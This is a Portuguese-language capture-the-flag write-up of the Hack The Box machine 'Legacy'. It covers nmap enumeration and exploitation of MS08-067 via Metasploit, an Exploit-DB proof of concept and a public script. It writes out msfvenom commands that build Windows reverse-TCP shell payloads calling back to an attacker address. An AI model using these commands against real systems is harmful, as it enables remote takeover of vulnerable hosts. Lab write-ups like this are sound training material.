---
title: "Hack The Box - Legacy"
tags: [Windows,Easy,Metasploit]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_1.png)

Link: <https://www.hackthebox.eu/home/machines/profile/2>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas aberta no servidor e 1 fechada

> Possivelmente portas relacionadas a um servidor samba: 139 e 445

> Porta 3389 que está fechada é por que algum firewall está bloqueando, então o retorno do nmap é diferente

## Enumeração das portas 139 e 445

Rodamos novamente o nmap com a opçõa `--script vuln` na porta 445, pra procurar por possíveis vulnerabilidades no servidor samba

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_nmap2.png)

Encontramos que ele possivelmente está vulnerável ao *MS08-067*

# Primeiro modo de explorar --> Metasploit Framework

### Procuramos pelo exploit no Metasploit Framework

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_msf.png)

### Configuramos o exploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_msf1.png)

### Executamos o exploit e ganhamos acesso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_msf2.png)

#### Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_root.png)

# Segundo modo de explorar --> Sem o Metasploit Framework

### Pesquisamos pela vulnerabilidade no Google, pra encontrarmos exploits

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_google.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_exploitdb.png)

### Copiamos ela para a Kali e verificamos como o exploit funciona

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_exploit.png)

Verificamos que devemos alterar o `shellcode`

Com o `msfvenom` criamos um novo shellcode para ser executado

> msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.119 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_exploit2.png)

Como podemos verificar o tamanho dele deu *388* e o que está na PoC deu *380* ou seja, devemos apagar *8* nops para ele funcionar

### Fazemos as alterações e colocamos nosso shell dentro do exploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_exploit1.png)

### Executamos o exploit (lembrar de deixar a conexão reversa aberta com o nc) recebemos a shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_exploit3.png)

# Terceiro modo de explorar --> Sem o handler, recebendo uma conexão do nc

Nesse caso iremos utilizar esse exploit, uma vez que com ele não precisamos nos preocupar com alterar a quantidade de Nops, facilitando o trabalho

> https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py

No segundo caso não daria para utilizarmos o `nc` pois o shellcode que foi gerado é `Staged` ou seja, assim que ele se conecta na nossa máquina ele vai tentar baixar o resto do exploit para executar e nos dar uma conexão reversa.

Agora vou criar um shellcode `Stageless` que vai inteiro já para a conexão, vamos perceber que ele é maior que o `Staged` isso se da por que tudo que o sistema precisa para nos dar um shell reverso já está incluso nele

### Criando um shellcode `Stageless` no msfvenom

> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.119 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -a x86 --platform windows -v shellcode

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_exploit4.png)

### Colocamos no exploit nosso shellcode gerado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_exploit5.png)

Verificamos como executar o exploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_exploit6.png)

> Windows XP English --> 6

### Executamos o exploit (lembrar de deixar a conexão reversa aberta no nc) e recebemos o shell reverso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-legacy/Legacy_exploit7.png)